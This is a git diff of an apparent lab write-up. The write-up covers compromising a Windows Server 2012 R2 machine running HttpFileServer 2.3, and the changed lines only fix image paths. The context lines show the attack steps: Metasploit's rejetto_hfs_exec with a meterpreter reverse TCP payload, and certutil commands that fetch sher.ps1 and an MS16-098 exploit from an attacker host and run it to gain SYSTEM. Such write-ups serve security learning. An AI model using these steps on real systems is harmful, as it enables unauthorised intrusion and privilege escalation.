@@ -27,7 +27,7 @@ This confirmed **complete system-level compromise** of the Windows Server 2012 R
 ```
 nmap -A -T4 -p- 10.10.10.8
 ```
-![](../../../../z%20(Attachments)/Pasted%20image%2020260808214521.png)
+![](Attachments/Pasted%20image%2020260808214521.png)
 
 **Results:**
 
@@ -45,7 +45,7 @@ http://10.10.10.8
 revealed the **HttpFileServer 2.3** web interface.
 
 ** website:**
-![](../../../../z%20(Attachments)/Pasted%20image%2020260809192413.png)
+![](Attachments/Pasted%20image%2020260809192413.png)
 
 The exposed HFS version was identified as a potential attack surface and was researched for known vulnerabilities.
 
@@ -67,7 +67,7 @@ The following module was identified:
 exploit/windows/http/rejetto_hfs_exec
 ```
 
-![](../../../../z%20(Attachments)/Pasted%20image%2020260809192856.png)
+![](Attachments/Pasted%20image%2020260809192856.png)
 
 This module targets a remote command-execution vulnerability in Rejetto HttpFileServer.
 
@@ -83,7 +83,7 @@ The available exploit targets were checked:
 show targets
 ```
 The module showed an automatic target option.
-![](../../../../z%20(Attachments)/Pasted%20image%2020260809193203.png)
+![](Attachments/Pasted%20image%2020260809193203.png)
 
 A Windows x64 Meterpreter reverse TCP payload was selected:
 ```
@@ -91,10 +91,10 @@ set payload windows/x64/meterpreter/reverse_tcp
 ```
 The required payload settings included the listener address and port.
 
-![](../../../../z%20(Attachments)/Pasted%20image%2020260809193345.png)
+![](Attachments/Pasted%20image%2020260809193345.png)
 
 the required information:
-![](../../../../z%20(Attachments)/Pasted%20image%2020260809193549.png)
+![](Attachments/Pasted%20image%2020260809193549.png)
 
 ---
 ## 4. Initial Access Result:
@@ -105,7 +105,7 @@ The system information was then checked:
 ```
 sysinfo
 ```
-![](../../../../z%20(Attachments)/Pasted%20image%2020260809195236.png)
+![](Attachments/Pasted%20image%2020260809195236.png)
 
 This confirmed that the target was running **Windows Server 2012 R2 x64**.
 
@@ -125,7 +125,7 @@ search Metasploit Local Exploit Suggester:
 ```
 search suggester
 ```
-![](../../../../z%20(Attachments)/Pasted%20image%2020260809215647.png)
+![](Attachments/Pasted%20image%2020260809215647.png)
 
 The following module was identified:
 ```
@@ -137,13 +137,13 @@ set session 1
 ```
 
 `run`the exploit:
-![](../../../../z%20(Attachments)/Pasted%20image%2020260809220708.png)
+![](Attachments/Pasted%20image%2020260809220708.png)
 
 However, the exploit **failed to create a new session**.
 
 
 check the operating system details given by the meterpreter:
-![](../../../../z%20(Attachments)/Pasted%20image%2020260809223012.png)
+![](Attachments/Pasted%20image%2020260809223012.png)
 ```
 Windows 2012 R2 (Build 9600)
 ```
@@ -154,7 +154,7 @@ search a exploit on this in the google: (https://www.exploit-db.com/exploits/397
 ```
 search ms16-032
 ```
-![](../../../../z%20(Attachments)/Pasted%20image%2020260809224026.png)
+![](Attachments/Pasted%20image%2020260809224026.png)
 
 The identified module was:
 ```
@@ -165,7 +165,7 @@ use exploit/window/local/ms16_032_secondary_logon_handler_privesc
 - set the other details too (lhost , lport.....etc)
 
 next, `run`:
-![](../../../../z%20(Attachments)/Pasted%20image%2020260809230507.png)
+![](Attachments/Pasted%20image%2020260809230507.png)
 didn't worked again.
 
 ---
@@ -183,11 +183,11 @@ Go back to the meterpreter and do `certutil`to download a file:
 ```
 certutil -urlcache -f http://<ATTACKER_IP>:<PORT>/sher.ps1 sher.ps1
 ```
-![](../../../../z%20(Attachments)/Pasted%20image%2020260810000043.png)
+![](Attachments/Pasted%20image%2020260810000043.png)
 the file is uploaded into the window.
 
 Sherlock identified several potentially exploitable Windows vulnerabilities, including:
-![](../../../../z%20(Attachments)/Pasted%20image%2020260810000345.png)
+![](Attachments/Pasted%20image%2020260810000345.png)
 
 This demonstrated that the Windows installation was outdated and potentially vulnerable to multiple local privilege-escalation attacks.
 
@@ -230,7 +230,7 @@ The identified MS16-098 exploit was transferred to the target using `certutil`.
 ```
 certutil -urlcache -f http:<local-ip>/41020.exe sh.exe
 ```
-![](../../../../z%20(Attachments)/Pasted%20image%2020260810005750.png)
+![](Attachments/Pasted%20image%2020260810005750.png)
 
 next, execute the `sh.exe` file:
 ```
@@ -238,7 +238,7 @@ sh.exe
 ```
 and successfully the privilege was escalated.
 
-![](../../../../z%20(Attachments)/Pasted%20image%2020260810010100.png)
+![](Attachments/Pasted%20image%2020260810010100.png)
 
 This confirmed successful privilege escalation to the highest local Windows privilege level.
 
